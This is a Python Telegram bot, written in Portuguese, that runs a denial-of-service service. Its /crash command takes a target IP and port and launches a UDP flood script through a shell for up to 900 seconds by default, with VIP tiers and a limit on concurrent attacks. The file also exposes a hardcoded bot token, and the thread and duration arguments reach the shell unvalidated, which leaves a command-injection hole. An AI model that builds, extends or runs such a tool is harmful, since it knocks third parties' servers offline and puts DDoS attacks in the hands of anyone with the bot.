import telebot
import subprocess
import re
import time
from threading import Thread

BOT_TOKEN = "7972626459:AAGjV9QjaDRfEYXOO-X4TgXoWo2MqQbwMz8"
SEU_ID_TELEGRAM = 6430703027
bot = telebot.TeleBot(BOT_TOKEN)
processos = {}
vip_users = []  # Lista de usuários VIP
vip_commands = ['/crash']  # Comandos restritos a VIPs
MAX_ATTACKS = 3  # Limite de ataques simultâneos

# Função para validar o formato de IP e Porta
def validar_ip_porta(ip_porta):
    padrao = r'^\d{1,3}(\.\d{1,3}){3}:\d+$'
    match = re.match(padrao, ip_porta)
    return match is not None

# Função para executar o comando do ataque
def executar_comando(ip_porta, threads, tempo):
    comando_terminal = f"python3 start.py UDP {ip_porta} {threads} {tempo}"
    try:
        processo = subprocess.Popen(
            comando_terminal, 
            shell=True, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE
        )
        processos[ip_porta] = processo
        time.sleep(int(tempo))  # Aguarda o tempo do ataque
        processo.terminate()  # Termina o processo após o tempo especificado
        del processos[ip_porta]  # Remove o processo da lista
    except Exception as e:
        print(f"Erro ao executar o comando: {str(e)}")

# Função para gerenciar o limite de ataques simultâneos
def manage_attacks():
    if len(processos) >= MAX_ATTACKS:
        oldest_process = list(processos.values())[0]  # Pega o primeiro processo
        oldest_process.terminate()  # Termina o processo mais antigo
        del processos[list(processos.keys())[0]]  # Remove da lista de processos

# Comando /crash
@bot.message_handler(commands=['crash'])
def crash_server(message):
    if '/crash' in vip_commands and message.from_user.id not in vip_users and message.from_user.id != SEU_ID_TELEGRAM:
        bot.send_message(message.chat.id, "❌ Este comando é restrito a usuários VIP.")
        return

    try:
        command_parts = message.text.split()

        # Verifica o número de argumentos enviados
        if len(command_parts) == 2:  # Apenas IP:PORTA fornecido
            ip_port = command_parts[1]
            threads = "10"  # Valor padrão
            duration = "900"  # Valor padrão
        elif len(command_parts) == 3:  # IP:PORTA e duração fornecidos
            ip_port = command_parts[1]
            threads = "10"  # Valor padrão
            duration = command_parts[2]
        elif len(command_parts) == 4:  # IP:PORTA, threads e duração fornecidos
            ip_port = command_parts[1]
            threads = command_parts[2]
            duration = command_parts[3]
        else:
            bot.send_message(message.chat.id, "Uso correto: /crash <IP:PORTA> [threads] [tempo]")
            return

        # Valida o formato do IP e Porta
        if not validar_ip_porta(ip_port):
            bot.send_message(message.chat.id, "Formato inválido de IP e porta. Use o formato: IP:PORTA")
            return

        manage_attacks()  # Gerencia o limite de ataques

        # Inicia o ataque em uma nova thread
        thread = Thread(target=executar_comando, args=(ip_port, threads, duration))
        thread.start()

        bot.send_message(
            message.chat.id, 
            f"🚀 Ataque enviado para {ip_port} com {threads} threads por {duration} segundos!"
        )
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ocorreu um erro: {str(e)}")

# Comando /start
@bot.message_handler(commands=['start'])
def start_message(message):
    welcome_text = (
        "Bem-vindo ao bot! 🚀\n\n"
        "Aqui estão os comandos disponíveis para você:\n\n"
        "Comandos básicos:\n"
        "/crash <IP:PORTA> [tempo] - Envia um ataque ao IP especificado.\n"
        "/meuid - Mostra seu ID de usuário.\n\n"
        "Comandos para usuários VIP:\n"
        "/adduser <ID> - Adiciona um usuário autorizado.\n"
        "/removeuser <ID> - Remove um usuário autorizado.\n"
        "/promovervip <ID> - Promove um usuário a VIP. (Somente o dono pode)\n"
        "/rebaixarvip <ID> - Remove o status de VIP de um usuário. (Somente o dono pode)\n\n"
        "Comandos exclusivos do dono do bot:\n"
        "/addcomandovip <comando> - Restringe um comando para VIPs.\n"
        "/revcomandovip <comando> - Remove a restrição de comando VIP.\n\n"
        "Entre em contato se precisar de ajuda! 😉 🪶Created by: @werbert_ofc"
    )
    bot.send_message(message.chat.id, welcome_text)

# Função para manter o bot ativo
def keep_alive():
    while True:
        try:
            bot.polling(timeout=60)
        except Exception as e:
            print(f"Erro no bot: {e}")
            time.sleep(15)

if __name__ == "__main__":
    keep_alive()